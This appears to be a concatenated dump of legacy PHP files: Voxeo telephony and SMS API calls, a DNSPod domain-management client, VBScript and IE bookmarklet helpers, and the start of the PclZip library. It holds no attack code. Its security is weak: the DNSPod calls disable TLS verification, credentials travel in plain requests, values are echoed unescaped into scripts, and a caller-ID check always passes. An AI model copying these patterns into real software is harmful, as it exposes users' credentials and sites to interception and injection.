	$url = "http://api.voxeo.net/SessionControl/4.5.41/VoiceXML.start?tokenid=".$this->OutboundDialingtoken."&callerid=14074181800&numbertodial=".encodeuri($Calledid);
	//$postdata = '';
	//$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
	//$header[] = "Content-length: ".strlen($postdata);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
	//curl_setopt($ch, CURLOPT_USERPWD, $voxeouser.':'.$voxeopwd);
	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
	//curl_setopt($ch, CURLOPT_POST, 1);
	//curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
	$result = curl_exec($ch);
	
  $tmpArr = explode("\n", $result);
  $resultArr = array();
  for($i=1;$i<count($tmpArr);$i++) {
                $value = trim($tmpArr[$i]);
                if($value != '') {
	                if(($value == 'success') && ($i==count($tmpArr)-2)){
	  								$resultArr['result'] = $value;
  	              }
                	else{
                  	$arr = explode(':', $value);
                  	if($arr[0]=='Date'){
    	              	$k = $arr[0];
	                  	$resultArr[$k] = $arr[1].":".$arr[2].":".$arr[3];
                  	}
                  	else{
    	              	$k = $arr[0];
  	                	$v = $arr[1];
	                  	$resultArr[$k] = $v;
                  	}
                	}
                }
  }

  $resultArr['code'] = curl_getinfo($ch,CURLINFO_HTTP_CODE);
  $resultArr['timestamp'] = strtotime($resultArr['Date']);
  $resultArray = array();
  if($resultArr['result'] == 'success')
  	$resultArray['result'] = 'ok';
  $resultArray['timestamp'] = $resultArr['timestamp'];
  
	curl_close($ch);
	//print_r($tmpArr);
	return $resultArray;
}

function Phonelimiter() {
 $phoneallow = "xcy6272003|8615998963077|503a8766-770c-4e41-bfb7-9e4735a3d0dc"; 
 return $phoneallow;
}

function voxeoverifycallid($callid){
 	$allowphone = $this->Phonelimiter();
	for($i=0;$i<count(split("[|]",$allowphone));$i++){
		// voxeo CALLME 插件特有
  	if(preg_match("/\w{8}[-]\w{4}[-]\w{4}[-]\w{4}[-]\w{12}/", strtolower(trim(arrmember(split("[|]",$allowphone),$i))))){
   		return "1";
  	}
  	elseif($callid==arrmember(split("[|]",$allowphone),$i)){
   		return "1";
  	}
 	}
 	return "0";
}

function voxeosendsms2($userto,$msg){
	$url = 'http://api.messaging.staging.voxeo.net/1.0/messaging';
	$postdata = "botkey=".$this->botkey."&apimethod=send&user=".trim($userto)."&network=SMS&from=".trim($this->usernumber)."&msg=".encodeuri($msg);
	$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
	$header[] = "Content-length: ".strlen($postdata);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
	curl_setopt($ch, CURLOPT_USERPWD, $this->voxeouser.':'.$this->voxeopwd);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15000);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
	$xmlstr = curl_exec($ch);
	$xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $xmlstr;
}

function voxeosendsms($userto,$msg){
	$url = 'http://api.messaging.staging.voxeo.net/1.0/messaging';
	$postdata = "botkey=".$this->botkey."&apimethod=send&user=".trim($userto)."&network=SMS&from=".trim($this->usernumber)."&msg=".encodeuri($msg);
	$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
	$header[] = "Content-length: ".strlen($postdata);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
	curl_setopt($ch, CURLOPT_USERPWD, $this->voxeouser.':'.$this->voxeopwd);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15000);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
	$xmlstr = curl_exec($ch);
	$xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
	curl_close($ch);
	//echo $xmlcode;
	return $xmlstr;
}

function receivesms($voxeouser,$voxeopwd,$usernumber,$userfrom,$msg){
	return "&to=".trim($usernumber)."user=".trim($userfrom)."&msg=".encodeuri($msg);
}


}
?>

<?php 

class dnspod_class{
function dnspoddomainlist($dnspoduname,$dnspodpwd,$type,$page,$pagesize){
        //echo $page.$pagesize;
        if (0){
                $totalrecord = '35';
                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                '<dnspod>'.
                                '<status>'.
                                '<code>1</code>'.
                                '<message>Get domain list success</message>'.
                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                '</status>'.
                                '<info>'.
                                '<domain_total>'.$totalrecord.'</domain_total>'.
                                '</info>'.
                                '<domains>';
                if (ceil($totalrecord/$pagesize) > $page){
                        $strpagesize = $pagesize;
                }       
                elseif (ceil($totalrecord/$pagesize) == $page){
                        $strpagesize = fmod($totalrecord,$pagesize);
                }       
                for($i=1;$i<=$strpagesize;$i++){                        
                        $xmlstr = $xmlstr.
                                        '<item>'.
                                        '<id>141842</id>'.
                                        '<name>dnspoo.com</name>'.
                                        '<grade>D_Free</grade>'.
                                        '<status>enable</status>'.
                                        '<records>0</records>'.
                                        '<shared_from>dnspod@dnspod.com</shared_from>'.
                                        '</item>';              
                }
                $xmlstr = $xmlstr.
                                '</domains>'.
                                '</dnspod>';
        }       
        else{   
                $ch = curl_init();
                $url = "https://dnsapi.cn/Domain.List";
                $data = array(
                        'login_email' => $dnspoduname,
                        'login_password' => $dnspodpwd,
                        'format' => 'xml',
                        'type' => trim($type)==''?'mine':trim($type),
                        'offset' => $pagesize*($page-1),
                        'length' => $pagesize
                );
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
       
        $type = trim($type)==''?'mine':trim($type);
        //echo trim(request('type'))==''?'mine':trim(request('type'));
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        // 加Xml 文件    
        $objXml->loadXML($xmlstr);
        //echo $xmlstr;
        //return;

        $domainlist['code'] = $objXml->getElementsByTagName("code")->item(0)->nodeValue;
        $domainlist['message'] = $objXml->getElementsByTagName("message")->item(0)->nodeValue;

        $objList = $objXml->getElementsByTagName("item");                       
        $domainlist['length'] = $objList->length;

        //echo $objList->length;

        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
        //echo $pagesize;
        $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
        $domainlist['totalitem'] = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
        //echo $domainlist['totalitem'];
        //$totalitem = $objList->length;
        if (fmod($totalitem, $pagesize) == 0){
                $totalpage=$totalitem/$pagesize;
        }       
        else{
                $totalpage=ceil($totalitem/$pagesize);
        }       
        //echo $strpagesize;
        for($i = 0;$i <= $strpagesize-1;$i++){
                $objHdd = $objList->item($i);
                        $domainlist[$i]['domainid'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('id')->item(0)->nodeValue);
                        $domainlist[$i]['domain'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('name')->item(0)->nodeValue);
                        $domainlist[$i]['domaingrade'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('grade')->item(0)->nodeValue);
                        $domainlist[$i]['domainstatus'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('status')->item(0)->nodeValue);
                        $domainlist[$i]['domainrecords'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('records')->item(0)->nodeValue);
                        $domainlist[$i]['domainshared'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('shared_from')->item(0)->nodeValue);
        }
        //print_r($domainlist);
        return $domainlist;
}

function dnspoddomaincreate($dnspoduname,$dnspodpwd,$domain){
if (preg_match ("/([\w]*[\.])+[\w]+/i", trim($domain))){
        if (0){
                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                '<dnspod>'.
                                '<status>'.
                                '<code>1</code>'.
                                '<message>Domain name created success.</message>'.
                                '<created_at>2010-10-06 17:12:44</created_at>'.
                                '</status>'.
                                '<domain>'.
                                '<id>472146</id>'.
                                '<punycode>sexdiy.org</punycode>'.
                                '</domain>'.
                                '</dnspod>';
        }       
        else{   
                $ch = curl_init();
                $url = "https://dnsapi.cn/Domain.Create";
                $data = array(
                        'login_email' => $dnspoduname,
                        'login_password' => $dnspodpwd,
                        'domain' => trim($domain),
                        'format' => 'xml'
                );
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");                        
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr); 
        $dnspoddomaincreate['code'] = $objXml->getElementsByTagName("code")->item(0)->nodeValue;
        $dnspoddomaincreate['punycode'] = $objXml->getElementsByTagName("punycode")->item(0)->nodeValue;
        $dnspoddomaincreate['id'] = $objXml->getElementsByTagName("id")->item(0)->nodeValue;
        $dnspoddomaincreate['message'] = $objXml->getElementsByTagName("message")->item(0)->nodeValue;
}
return $dnspoddomaincreate;
}

function dnspoddomainremove($dnspoduname,$dnspodpwd,$domain_id,$type,$postfield,$page,$pagesize){
        if (trim($domain_id) != ""){
                if (0){
                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                        '<dnspod>'.
                                        '<status>'.
                                        '<code>1</code>'.
                                        '<message>Domain delete success.</message>'.
                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                        '</status>'.
                                        '</dnspod>';
                }       
                else{   
                        $ch = curl_init();
                        $url = "https://dnsapi.cn/Domain.Remove";
                        $data = array(
                                'login_email' => $dnspoduname,
                                'login_password' => $dnspodpwd,
                                'domain_id' => trim($domain_id),
                                'format' => 'xml'
                        );
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);                                
                        curl_close($ch);
                }
        }
        elseif (trim($domain_id) == "" && count($postfield) > 0){
                if (0){
                        $totalrecord = '220';
                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                        '<dnspod>'.
                                        '<status>'.
                                        '<code>1</code>'.
                                        '<message>Get domain list success</message>'.
                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                        '</status>'.
                                        '<info>'.
                                        '<domain_total>'.$totalrecord.'</domain_total>'.
                                        '</info>'.
                                        '<domains>';
                        if (ceil($totalrecord/$pagesize) > $page){
                                $strpagesize = $pagesize;
                        }       
                        elseif (ceil($totalrecord/$pagesize) == $page){
                                $strpagesize = fmod($totalrecord,$pagesize);
                        }       
                        for($i=1;$i<=$strpagesize;$i++){
                                $xmlstr = $xmlstr.
                                                '<item>'.
                                                '<id>141842</id>'.
                                                '<name>dnspoo.com</name>'.
                                                '<grade>D_Free</grade>'.
                                                '<status>enable</status>'.
                                                '<records>0</records>'.
                                                '<shared_from>dnspod@dnspod.com</shared_from>'.
                                                '</item>';              
                        }
                        $xmlstr = $xmlstr.
                                        '</domains>'.
                                        '</dnspod>';
                }       
                else{   
                        $ch = curl_init();
                        $url = "https://dnsapi.cn/Domain.List";
                        $data = array(
                                'login_email' => $dnspoduname,
                                'login_password' => $dnspodpwd,
                                'format' => 'xml',
                                'type' => trim($type)==''?'mine':trim($type),
                                'offset' => $pagesize*($page-1),
                                'length' => $pagesize                           
                        );
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);                                
                        curl_close($ch);
                }
                $type = trim($type)==''?'mine':trim($type);
                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                // 加Xml 文件    
                $objXml->loadXML($xmlstr);      
        
                $objList = $objXml->getElementsByTagName("item");                       
                if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }

                //$xmlstr = "";
                $xmlstr = "wait";                       
                for($i = 0;$i <= $strpagesize-1;$i++){
                        $objHdd = $objList->item($i);
                        if ($postfield["chidd".$i] != ""){
                                if (0){
                                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                        '<dnspod>'.
                                                        '<status>'.
                                                        '<code>1</code>'.
                                                        '<message>Domain delete success.</message>'.
                                                        '<created_at>2008-11-26 16:12:00</created_at>'.
                                                        '</status>'.
                                                        '</dnspod>';
                                }       
                                else{   
                                        $ch = curl_init();
                                        $url = "https://dnsapi.cn/Domain.Remove";
                                        $data = array(
                                                'login_email' => $dnspoduname,
                                                'login_password' => $dnspodpwd,
                                                'domain_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                'format' => 'xml'
                                        );
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                        $xmlstr = curl_exec($ch);
                                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);                                
                                        curl_close($ch);
                                }
                        }       
                        if ($xmlstr == "" || $xmlstr == "wait"){
                        }
                        else{
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                $objXml->loadXML($xmlstr);                              
                                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                        break;
                        }       
                }                               
        }

        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);    
        $dnspoddomainremove['xmlcode'] = $xmlcode;
        $dnspoddomainremove['xmlstr'] = $xmlstr;                
        $dnspoddomainremove['code'] = $objXml->getElementsByTagName("code")->item(0)->nodeValue;
        $dnspoddomainremove['message'] = $objXml->getElementsByTagName("message")->item(0)->nodeValue;          
        return $dnspoddomainremove;
}

}
?>

<?php 
class PageChange{
function gotopage($totalpage,$url,$title,$note){
?>
<script language="vbscript">
<!--
function gotopage()
dim pagecount,inttotalpage
inttotalpage = <?php  echo $totalpage; ?>
<?php echo "\r\n";?>
pagecount=int(trim(inputbox("<?php  echo $note;?>","<?php  echo $title; ?>")))
if int(pagecount) > int(inttotalpage) then
        msgbox("<?php echo formatchar("输入页码大于实际页数！")?>")
else
        window.location.href="<?php  echo $url;?>"&pagecount
end if
end function
//-->
</script>
<?php       
}

function CallPageChange(){
?>
                <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:50px;font-size:11px;" <?php  $style->input("#FCFC9D",""); ?>>
								<input type="submit" class="button" name="gotopage" value=" Go ">                
                <NOSCRIPT>
                <a href="#" style="color:#444444" onclick="vbscript:gotopage()"><?php echo formatchar('转到')?></a>
                </NOSCRIPT>
<?php 
}

}
?>

<?php 
class TagAction{

function TagAction(){
}

function getinfo($url,$type='image',$width,$height){
?>
<html>
<script LANGUAGE="JavaScript">
if (external.menuArguments){
        var parentwin = external.menuArguments;
        var sel,url,title;

	<?php 
	if ($type == 'image'){
	?>
        if(parentwin.event.srcElement.tagName == "IMG"){
                url = parentwin.event.srcElement.getAttribute("SRC");
                if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != ""){
                        title = parentwin.event.srcElement.getAttribute("ALT");
                        sel = parentwin.event.srcElement.getAttribute("ALT");
                }
                else if(parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText!= ""){
                        title = parentwin.event.srcElement.innerText;
                        sel = parentwin.event.srcElement.innerText;
                }
                else if(parentwin.document.title != null && parentwin.document.title != ""){
                        title = parentwin.document.title;
                        sel = parentwin.document.title;
                }       
                else if(parentwin.event.srcElement.getAttribute("SRC") != null && parentwin.event.srcElement.getAttribute("SRC") != ""){
                        title = parentwin.event.srcElement.getAttribute("SRC");
                        sel = parentwin.event.srcElement.getAttribute("SRC");
                }       
                else{
                        sel = parentwin.location.href;
                        title = parentwin.location.href;
                }       
        }
        <?php 
	}
	elseif ($type == 'link'){
        ?>
        if(parentwin.event.srcElement.tagName == "IMG"){
                url = parentwin.event.srcElement.getAttribute("SRC");
                if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != ""){
                        title = parentwin.event.srcElement.getAttribute("ALT");
                        sel = parentwin.event.srcElement.getAttribute("ALT");
                }
                else if(parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText!= ""){
                        title = parentwin.event.srcElement.innerText;
                        sel = parentwin.event.srcElement.innerText;
                }
                else if(parentwin.document.title != null && parentwin.document.title != ""){
                        title = parentwin.document.title;
                        sel = parentwin.document.title;
                }       
                else if(parentwin.event.srcElement.getAttribute("SRC") != null && parentwin.event.srcElement.getAttribute("SRC") != ""){
                        title = parentwin.event.srcElement.getAttribute("SRC");
                        sel = parentwin.event.srcElement.getAttribute("SRC");
                }       
                else{
                        sel = parentwin.location.href;
                        title = parentwin.location.href;
                }       
        }
        else if (parentwin.event.srcElement.tagName == "A") {
                url = parentwin.event.srcElement.getAttribute("HREF");
                if(parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText!= "")
                        title = parentwin.event.srcElement.innerText;
                else if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != "")
                        title = parentwin.event.srcElement.getAttribute("ALT");
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        title = parentwin.document.title;
                else if(parentwin.event.srcElement.getAttribute("HREF") != null && parentwin.event.srcElement.getAttribute("HREF") != "")
                        title = parentwin.event.srcElement.getAttribute("HREF");
                else title = parentwin.location.href;
                
                if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != "")
                        sel = parentwin.event.srcElement.getAttribute("ALT");
                else if (parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText != "")
                        sel = parentwin.event.srcElement.innerText;
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        sel = parentwin.document.title;
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        sel = parentwin.document.title;
                else if(parentwin.event.srcElement.getAttribute("HREF") != null && parentwin.event.srcElement.getAttribute("HREF") != "")
                        sel = parentwin.event.srcElement.getAttribute("HREF");
                else sel = parentwin.location.href;             
                        
        }
        <?php 
	}
	?>
        else {
                if(parentwin.document.selection.createRange().text != null && parentwin.document.selection.createRange().text != "")
                        sel = parentwin.document.selection.createRange().text;
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        sel = parentwin.document.title; 
                else sel = parentwin.location.href;     

                sel = parentwin.document.selection.createRange().text;

                url = parentwin.location.href;
                
                if(parentwin.document.title != null && parentwin.document.title != ""){
                        title = parentwin.document.title;       
                }       
                else if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != ""){
                        title = parentwin.event.srcElement.getAttribute("ALT"); 
                }       
                else title = parentwin.location.href;           
        }

        var strjavascriptdig = '<?php  echo $url; ?>&t='+escape(title)+'&u='+escape(url)+'&c='+escape(sel);
        void(window.open(strjavascriptdig,'_blank','scrollbars=yes,width=<?php echo $width;?>,height=<?php echo $height;?>,left=75,top=50,status=yes,resizable=yes'));
}
else {
        history.go(-1);
}
</script>
</html>
<?php 
//redirect($url);
}

function jscento(){
?>
<script language="javascript">
function selectTag(obj, index)
{
        if (document.all.XSort.value.indexOf(obj.options[index].value) < 0)
        {
                if (obj.options[index].value != "\"0\"")
                {
                        document.all.XSort.value += " " + obj.options[index].value;
                }
        }
}
</script>

<script language=javascript>
function checkForm(this_form)
{
        if (this_form.Title.value == '')
    {
                alert("标题不能为空, 请重新输入！");
                this_form.Title.focus();                
                return false;
    }

        if (this_form.FromURL.value == '')
    {
                alert("网址不能为空, 请重新输入！");
                this_form.FromURL.focus();              
                return false;
    }

        str = this_form.Title.value;
        len = str.length;       
        
        var tt= "";
        if (str != '')
        {
                var i=0;
                do
                {
                        var c = str.substr(i, 1);
                        if (c != " ")
                        {
                                tt += c;
                                
                                //return false;
                        }
                }while(++i < len);
        }       
        
        var length=this_form.Title.value.length;
        if (this_form.Title.value!="")
        {       
                for(i=0;i<this_form.Title.value.length;i++)
                {
                        if(this_form.Title.value.charCodeAt(i)>255)
                        {
                                length++;
                        }
                }
                if (length > 100)
                {
                        alert ("标题50个汉字之内，请重新输入");
                        this_form.Title.focus();                        
                        return false;
                }
        }
        
        length=this_form.Intro.value.length;
        if (this_form.Intro.value!="")
        {       
                for(i=0;i<this_form.Intro.value.length;i++)
                {
                        if(this_form.Intro.value.charCodeAt(i)>2555)
                        {
                                length++;
                        }
                }
                if (length > 10000)
                {
                        alert ("简介200个汉字之内，请重新输入");
                        this_form.Intro.focus();                                                
                        return false;
                }
        }
        return true;
}
</script>
<script language="JavaScript">
<!--
var Href,Title,Url,Cento;

Href=document.location.href;
var re;
re=new RegExp("&t=(.[^&]*)","ig");
if(re.test(Href)){
        re.exec(Href);
        Title=unescape(RegExp.$1);
}else{
        Title="";
}

re=new RegExp("&u=(.[^&]*)","ig");
if(re.test(Href)){
        re.exec(Href);
        Url=unescape(RegExp.$1);
        re=new RegExp("^(.[^#]*)","ig");
        if(re.test(Url)){
                re.exec(Url);
                Url=RegExp.$1;
        }
}else{
        Url="";
}

re=new RegExp("&c=(.[^&]*)","ig");
if(re.test(Href)){
        re.exec(Href);
        Cento=unescape(RegExp.$1);
}else{
        Cento="";
}
//-->
</script>
<?php 
}

function jscentoload($formname,$unitname,$selectname){
//可选参数：Cento,Title,Url
if (stripos($selectname,"|") == false){
?>
<script language="JavaScript">
        <!--
        document.<?php echo $formname;?>.<?php echo $unitname;?>.value=<?php echo $selectname;?>;
        //-->
</script>
<?php 
}
elseif (stripos($selectname,"|") >= 0){
?>
<script language="JavaScript">
        <!--
        document.<?php echo $formname;?>.<?php echo $unitname;?>.value="标题："+<?php echo arrmenber(split("|",$selectname),(0))?>+"；连接："+<?php  echo arrmember(split("[|]",$selectname),(1))?>+"；摘要："+<?php echo arrmember(split("[|]",$selectname),(2))?>;
        //-->
</script>
<?php 
}
}

}

?>  

<?php 
// --------------------------------------------------------------------------------
// PhpConcept Library - Zip Module 2.6
// --------------------------------------------------------------------------------
// License GNU/LGPL - Vincent Blavet - March 2006
// http://www.phpconcept.net
// --------------------------------------------------------------------------------
//
// Presentation :
//   PclZip is a PHP library that manage ZIP archives.
//   So far tests show that archives generated by PclZip are readable by
//   WinZip application and other tools.
//
// Description :
//   See readme.txt and http://www.phpconcept.net
//
// Warning :
//   This library and the associated files are non commercial, non professional
//   work.
//   It should not have unexpected results. However if any damage is caused by
//   this software the author can not be responsible.
//   The use of this software is at the risk of the user.
//
// --------------------------------------------------------------------------------
// $Id: pclzip.lib.php,v 1.47 2007/07/20 13:56:07 vblavet Exp $
// --------------------------------------------------------------------------------

  // ----- Constants
  if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
    define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
  }
  
  // ----- File list separator
  // In version 1.x of PclZip, the separator for file list is a space
  // (which is not a very smart choice, specifically for windows paths !).
  // A better separator should be a comma (,). This constant gives you the
  // abilty to change that.
  // However notice that changing this value, may have impact on existing
  // scripts, using space separated filenames.
  // Recommanded values for compatibility with older versions :
  //define( 'PCLZIP_SEPARATOR', ' ' );
  // Recommanded values for smart separation of filenames.
  if (!defined('PCLZIP_SEPARATOR')) {
    define( 'PCLZIP_SEPARATOR', ',' );
  }

  // ----- Error configuration
  // 0 : PclZip Class integrated error handling
  // 1 : PclError external library error handling. By enabling this
  //     you must ensure that you have included PclError library.
  // [2,...] : reserved for futur use
  if (!defined('PCLZIP_ERROR_EXTERNAL')) {
    define( 'PCLZIP_ERROR_EXTERNAL', 0 );
  }

  // ----- Optional static temporary directory
  //       By default temporary files are generated in the script current
  //       path.
  //       If defined :
  //       - MUST BE terminated by a '/'.
  //       - MUST be a valid, already created directory
  //       Samples :
  // define( 'PCLZIP_TEMPORARY_DIR', '/temp/' );
  // define( 'PCLZIP_TEMPORARY_DIR', 'C:/Temp/' );
  if (!defined('PCLZIP_TEMPORARY_DIR')) {
    define( 'PCLZIP_TEMPORARY_DIR', '' );
  }

// --------------------------------------------------------------------------------
// ***** UNDER THIS LINE NOTHING NEEDS TO BE MODIFIED *****
// --------------------------------------------------------------------------------

  // ----- Global variables
  $g_pclzip_version = "2.6";

  // ----- Error codes
  //   -1 : Unable to open file in binary write mode
  //   -2 : Unable to open file in binary read mode
  //   -3 : Invalid parameters
  //   -4 : File does not exist
  //   -5 : Filename is too long (max. 255)
  //   -6 : Not a valid zip file
  //   -7 : Invalid extracted file size
  //   -8 : Unable to create directory
  //   -9 : Invalid archive extension
  //  -10 : Invalid archive format
  //  -11 : Unable to delete file (unlink)
  //  -12 : Unable to rename file (rename)
  //  -13 : Invalid header checksum
  //  -14 : Invalid archive size
  define( 'PCLZIP_ERR_USER_ABORTED', 2 );
  define( 'PCLZIP_ERR_NO_ERROR', 0 );
  define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
  define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
  define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
  define( 'PCLZIP_ERR_MISSING_FILE', -4 );
  define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
  define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
  define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
  define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
  define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
  define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
  define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
  define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
  define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
  define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
  define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
